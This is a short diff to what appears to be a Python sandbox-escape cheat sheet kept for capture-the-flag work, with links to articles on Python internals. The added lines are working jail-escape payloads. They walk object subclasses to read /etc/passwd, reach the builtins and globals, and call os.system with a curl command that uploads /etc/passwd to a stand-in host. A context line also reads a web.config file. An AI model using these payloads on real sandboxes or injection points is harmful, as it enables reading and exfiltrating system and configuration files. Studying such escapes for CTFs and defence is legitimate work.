@@ -26,6 +26,10 @@ for l in solve.func_globals["sys"].modules["io"].FileIO(r'path\to\web.config'): 
 
 https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/
 
+''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
+''.__class__.__mro__[2].__subclasses__()[59].__repr__.im_func.func_globals['__builtins__']['globals']()"
+''.__class__.__mro__[2].__subclasses__()[59].__enter__.__func__.__globals__['linecache'].checkcache.__globals__['os'].system('curl%20me%20-Ffoo%3d%40/etc/passwd') # bsidessf ctf 2017
+
 # cool links
 http://www.rafekettler.com/magicmethods.html
 http://www.e-booksdirectory.com/programming.php#python
